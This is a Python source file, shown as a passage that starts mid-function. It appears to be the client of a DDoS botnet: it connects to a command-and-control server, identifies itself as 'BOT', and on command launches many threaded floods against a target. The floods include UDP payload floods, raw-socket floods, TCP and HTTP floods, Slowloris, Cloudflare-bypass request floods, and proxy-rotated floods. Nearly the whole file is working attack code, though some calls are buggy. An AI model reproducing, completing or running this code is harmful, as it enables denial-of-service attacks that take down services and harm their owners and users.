                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
        dos.send(byt)
        for tread in range(500):
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            for tread in range(500):
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
                dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
        dos.send(byt)
    except socket.error:
        pass
    finally:
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()

def attack_pps(ip, port, secs):
    
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                
                for _ in range(1500):
                    s.send(f'GET / HTTP/1.1\r\n\r\n'.encode())
                    s.send(f'GET / HTTP/1.1\r\n\r\n'.encode())
                    s.send(f'GET / HTTP/1.1\r\n\r\n'.encode())
                    s.send(f'GET / HTTP/1.1\r\n\r\n'.encode())
                    s.send(f'GET / HTTP/1.1\r\n\r\n'.encode())
                    s.send(f'GET / HTTP/1.1\r\n\r\n'.encode())
        except:
            s.close()

def attack_std(ip, port, secs):
    
    payload = b'\x73\x74\x64\x00\x00\x00\x00\x00\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00'
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_icmp(ip, port, secs, size):
    
    payload = b'\x08\x00\xbd\xcb\x16\x4f\x00\x01\x92\xde\xe2\x50\x00\x00\x00\x00\xe1\xe1\x0e\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37'
    while time.time() < secs:
        
        s = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
        dport = random.randint(1, 65535) if port == 0 else port
        data = random._urandom(size)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_http_pyflooder_6k(ip, port,host):
    url_path = generate_url_path2()
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        dos.connect((ip, port))

        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
        for _ in range(25000):
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
            dos.send(byt)
    except socket.error:
        pass
    finally:
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()

def attack_icmp2(ip, port, secs):
    
    payload = b'\x08\x00\xbd\xcb\x16\x4f\x00\x01\x92\xde\xe2\x50\x00\x00\x00\x00\xe1\xe1\x0e\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37'
    while time.time() < secs:
        
        s = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
        dport = random.randint(1, 65535) if port == 0 else port
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_hex(ip, port, secs):
    
    payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_rhex(ip, port, secs):
    
    payload = randbytes(randchoice([32, 64, 128]))
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_cpukill(ip, port, secs):
    
    payload = b'\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_junk(ip, port, secs):
    
    payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_nulcear(ip, port, secs):
    size = int(0)
    print(size)
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            size += int(1)
            s.connect((ip, port))
            s.send(random._urandom(size))
            s.send(random._urandom(size))
            s.send(random._urandom(size))
            s.send(random._urandom(size))
            s.send(random._urandom(size))
            s.send(random._urandom(size))
            s.close()
            print(size)
            while time.time() < secs:
                for _ in range(1500):
                    size += int(1)
                    s.connect((ip, port))
                    s.send(random._urandom(size))
                    s.send(random._urandom(size))
                    s.send(random._urandom(size))
                    s.send(random._urandom(size))
                    s.send(random._urandom(size))
                    s.send(random._urandom(size))
                    s.close()
                    print(size)

        except:
            pass

def attack_nulcear2(ip, port, secs):
    size = int(0)
    print(size)
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            size += int(1)
            s.connect((ip, port))
            s.send(randbytes(size))
            s.send(randbytes(size))
            s.send(randbytes(size))
            s.send(randbytes(size))
            s.send(randbytes(size))
            s.send(randbytes(size))
            s.close()
            print(size)
            while time.time() < secs:
                for _ in range(1500):
                    size += int(1)
                    s.connect((ip, port))
                    s.send(randbytes(size))
                    s.send(randbytes(size))
                    s.send(randbytes(size))
                    s.send(randbytes(size))
                    s.send(randbytes(size))
                    s.send(randbytes(size))
                    s.close()
                    print(size)

        except:
            pass
        
def attack_vse(ip, port, secs):
    
    payload = b'\xff\xff\xff\xffTSource Engine Query\x00'
    while time.time() < secs:
         
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def sloworis(ip,port,secs):
    
    sockets = []
    def setupSocket(ip,port):
        random_list = random.choice(("FakeUser","User"))
        headers_ua = ""
        if "FakeUser" in random_list:
            headers_ua = f'{rand_ua("FakeUser")}'
        else:
            headers_ua = f'{rand_ua("User")}'
        headers = [
            f"User-agent: {headers_ua}",
            "Accept-language: en-US,en"
        ]
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect(ip,port)
        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))
        for header in headers:
            s.send("{}\r\n".format(header).encode("utf-8"))
        return s
    
    count = 1300
    
    for _ in range(count):
        try:
            sock = setupSocket(ip,port)
        except socket.error:
            break

        sockets.append(sock)
    
    while time.time() < secs:
         
        for sock in list(sockets):
            try:
                sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
            except socket.error:
                sockets.remove(sock)
        for _ in range(count - len(sockets)):
            try:
                sock = setupSocket(ip,port)
                if sock:
                    sockets.append(sock)
            except socket.error:
                break
        time.sleep(15)

def CFB(url,method,secs):
    
    while time.time() < secs:
         
        random_list = random.choice(("FakeUser","User"))
        headers = ""
        if "FakeUser" in random_list:
            headers = {'User-Agent': f'{rand_ua("FakeUser")}'}
        else:
            headers = {'User-Agent': f'{rand_ua("User")}'}
        scraper = cloudscraper.create_scraper()
        scraper = cloudscraper.CloudScraper()
        if "get" in method:
            for _ in range(1500):
                scraper.get(url,headers=headers, timeout=15)
        elif "post" in method:
            for _ in range(1500):
                scraper.post(url,headers=headers, timeout=15)
        elif "patch" in method:
            for _ in range(1500):
                scraper.patch(url,headers=headers, timeout=15)
        elif "put" in method:
            for _ in range(1500):
                scraper.put(url,headers=headers, timeout=15)
        elif "head" in method:
            for _ in range(1500):
                scraper.head(url,headers=headers, timeout=15)
        elif "delete" in method:
            for _ in range(1500):
                scraper.delete(url,headers=headers, timeout=15)
        elif "options" in method:
            for _ in range(1500):
                scraper.options(url,headers=headers, timeout=15)
        elif "all" in method:
            for _ in range(1500):
                scraper.get(url,headers=headers, timeout=15)
                scraper.post(url,headers=headers, timeout=15)
                scraper.patch(url,headers=headers, timeout=15)
                scraper.put(url,headers=headers, timeout=15)
                scraper.head(url,headers=headers, timeout=15)
                scraper.delete(url,headers=headers, timeout=15)
                scraper.options(url,headers=headers, timeout=15)

def flooding_hell(url,secs):
    
    def packet(URL):
        for _ in range(2500):
            http2 = urllib3.PoolManager()
            http2.request("GET",URL)
            http2.request("PUT",URL)
            http2.request("POST",URL)
            http2.request("PATCH",URL)
            http2.request("HEAD",URL)
            http2.request("DELETE",URL)
            http2.request("OPTIONS",URL)
            req = urllib.request.urlopen(http2.request("GET",URL))
            req = urllib.request.urlopen(http2.request("PUT",URL))
            req = urllib.request.urlopen(http2.request("POST",URL))
            req = urllib.request.urlopen(http2.request("PATCH",URL))
            req = urllib.request.urlopen(http2.request("HEAD",URL))
            req = urllib.request.urlopen(http2.request("DELETE",URL))
            req = urllib.request.urlopen(http2.request("OPTIONS",URL))
            req = urllib.request.urlopen(url=URL)
            req = urllib.request.urlopen(urllib.request.Request(url=URL))

    def packet2(URL):
        for _ in range(2500):
            scraper = cloudscraper.create_scraper()
            scraper = cloudscraper.CloudScraper()
            req = scraper.get(url=URL)
            req = requests.get(url=URL)
            req = httpx.get(url=URL)
            req = scraper.put(url=URL)
            req = requests.put(url=URL)
            req = httpx.put(url=URL)
            req = scraper.post(url=URL)
            req = requests.post(url=URL)
            req = httpx.post(url=URL)
            req = scraper.patch(url=URL)
            req = requests.patch(url=URL)
            req = httpx.patch(url=URL)
            req = scraper.head(url=URL)
            req = requests.head(url=URL)
            req = httpx.head(url=URL)
            req = scraper.delete(url=URL)
            req = requests.delete(url=URL)
            req = httpx.delete(url=URL)
            req = scraper.options(url=URL)
            req = requests.options(url=URL)
            req = httpx.options(url=URL)

    while time.time() < secs:
         
        th1 = threading.Thread(target=packet,args=(url), daemon=True)
        th2 = threading.Thread(target=packet2,args=(url), daemon=True)
        th2.start()
        th1.start()

def REQ_ATTACK2(url2,method):
    for _ in range(1500):
        try:
            if "get" in method:
                req = requests.get(url2,timeout=15)
            elif "post" in method:
                req = requests.post(url2,timeout=15)
            elif "put" in method:
                req = requests.put(url2,timeout=15)
            elif "patch" in method:
                req = requests.patch(url2,timeout=15)
            elif "delete" in method:
                req = requests.delete(url2,timeout=15)
            elif "head" in method:
                req = requests.head(url2,timeout=15)
            elif "options" in method:
                req = requests.options(url2,timeout=15)
            elif "all" in method:
                req = requests.get(url2,timeout=15)
                req = requests.post(url2,timeout=15)
                req = requests.put(url2,timeout=15)
                req = requests.patch(url2,timeout=15)
                req = requests.delete(url2,timeout=15)
                req = requests.head(url2,timeout=15)
                req = requests.options(url2,timeout=15)
        except:
            pass

def REQ_attack(ip,method,secs):
     
     while time.time() < secs:
         
        random_list = random.choice(("FakeUser","User"))
        headers = ""
        if "FakeUser" in random_list:
            headers = {'User-Agent': f'{rand_ua("FakeUser")}'}
        else:
            headers = {'User-Agent': f'{rand_ua("User")}'}
        if "get" in method:
            for _ in range(1500):
                requests.get(ip,headers=headers)
        elif "post" in method:
            for _ in range(1500):
                requests.post(ip,headers=headers)
        elif "put" in method:
            for _ in range(1500):
                requests.put(ip,headers=headers)
        elif "patch" in method:
            for _ in range(1500):
                requests.patch(ip,headers=headers)
        elif "delete" in method:
            for _ in range(1500):
                requests.delete(ip,headers=headers)
        elif "head" in method:
            for _ in range(1500):
                requests.head(ip,headers=headers)
        elif "options" in method:
            for _ in range(1500):
                requests.options(ip,headers=headers)
        elif "all" in method:
            for _ in range(1500):
                requests.get(ip,headers=headers)
                requests.post(ip,headers=headers)
                requests.put(ip,headers=headers)
                requests.patch(ip,headers=headers)
                requests.delete(ip,headers=headers)
                requests.head(ip,headers=headers)
                requests.options(ip,headers=headers)

def main():
    global STOP_Constant_Increasing_rate_attack,hell_packet_head
    
    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    while 1:
        try:
            c2.connect((C2_ADDRESS, C2_PORT))
            while 1:
                data = c2.recv(65536).decode()
                if 'Username' in data:
                    c2.send('BOT'.encode())
                    break
            while 1:
                data = c2.recv(65536).decode()
                if 'Password' in data:
                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                    break
            break
        except:
            time.sleep(90)
    while 1:
        try:
            data = c2.recv(69999).decode().strip()
            if not data:
                break
            args = data.split(' ')
            command = args[0].upper()
            if command == '.ICMP':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_icmp, args=(ip, port, secs), daemon=True).start()
            elif command == '.ICMP2':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_icmp, args=(ip, port, secs,size), daemon=True).start()
            elif command == '.ICMP3':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_icmp2, args=(ip, port, secs), daemon=True).start()
            elif command == '.ICMP4':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_icmp, args=(ip, port, secs,size), daemon=True).start()
                    threading.Thread(target=attack_icmp2, args=(ip, port, secs), daemon=True).start()
            elif command == ".HTTP_REQ":
                 
                ip = args[1]
                url = args[1]
                method = args[2]
                method_old = args[2]
                secs = time.time() + int(args[3])
                mode = args[4]
                threads = int(args[5])
                if "1" in mode:
                    for _ in range(threads):
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                elif "2" in mode:
                    for _ in range(threads):
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "3" in mode:
                    for _ in range(threads):
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "4" in mode:
                    for _ in range(threads):
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "5" in mode:
                    for _ in range(threads):
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "6" in mode:
                    for _ in range(threads):
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        for _ in range(500):
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "7" in mode:
                    for _ in range(threads):
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        for _ in range(500):
                            threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "8" in mode:
                    for _ in range(threads):
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        for _ in range(500):
                            threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                            threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "9" in mode:
                    for _ in range(threads):
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "10" in mode:
                    for _ in range(threads):
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                elif "11" in mode:
                    for _ in range(threads):
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "12" in mode:
                    for _ in range(threads):
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                elif "13" in mode:
                    for _ in range(threads):
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "14" in mode:
                    for _ in range(threads):
                        number_timeout = int(random.randint(50,10000))
                        country = str(random.choice(("LA","JP","CZ","HK","CY","SE","CH","TH","PK","US","SY","EN","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                        link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                        req = requests.get(link_get+country+'')
                        array = req.text.split()
                        check_prox(array,secs, url,method)
                elif "15" in mode:
                    number_timeout = int(random.randint(50,10000))
                    country = str(random.choice(("LA","JP","CZ","CY","SE","CH","HK","TH","US","PK","EN","SY","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                    link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                    req = requests.get(link_get+country+'')
                    array = req.text.split()
                    for _ in range(threads):
                        check_prox(array,secs, url,method)
                elif "16" in mode:
                    number_timeout = int(random.randint(50,10000))
                    for _ in range(threads):
                        country = str(random.choice(("LA","JP","CZ","CY","SE","CH","HK","TH","US","PK","EN","SY","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                        link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                        req = requests.get(link_get+country+'')
                        array = req.text.split()
                        check_prox(array,secs, url,method)
                        check_prox(array,secs, url,method)
                        check_prox(array,secs, url,method)
                        check_prox(array,secs, url,method)
                        check_prox(array,secs, url,method)
                elif "17" in mode:
                    number_timeout = int(random.randint(50,10000))
                    country = str(random.choice(("LA","JP","CZ","CY","SE","CH","TH","US","HK","EN","RU","PK","SY","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                    link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                    req = requests.get(link_get+country+'')
                    array = req.text.split()
                    for _ in range(threads):
                        check_prox(array,secs, url,method)
                        check_prox(array,secs, url,method)
                        check_prox(array,secs, url,method)
                        check_prox(array,secs, url,method)
                        check_prox(array,secs, url,method)
                elif "18" in mode:
                    for _ in range(threads):
                        number_timeout = int(random.randint(50,10000))
                        country = str(random.choice(("LA","JP","CZ","HK","CY","SE","CH","TH","PK","US","SY","EN","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                        link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                        req = requests.get(link_get+country+'')
                        array = req.text.split()
                        check_prox(array,secs, url,method)
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "19" in mode:
                    number_timeout = int(random.randint(50,10000))
                    country = str(random.choice(("LA","JP","CZ","CY","SE","CH","HK","TH","US","PK","EN","SY","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                    link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                    req = requests.get(link_get+country+'')
                    array = req.text.split()
                    for _ in range(threads):
                        check_prox(array,secs, url,method)
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "20" in mode:
                    for _ in range(threads):
                        number_timeout = int(random.randint(50,10000))
                        country = str(random.choice(("LA","JP","CZ","HK","CY","SE","CH","TH","PK","US","SY","EN","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                        link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                        req = requests.get(link_get+country+'')
                        array = req.text.split()
                        check_prox(array,secs, url,method)
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "21" in mode:
                    number_timeout = int(random.randint(50,10000))
                    country = str(random.choice(("LA","JP","CZ","CY","SE","CH","HK","TH","US","PK","EN","SY","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                    link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                    req = requests.get(link_get+country+'')
                    array = req.text.split()
                    for _ in range(threads):
                        check_prox(array,secs, url,method)
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
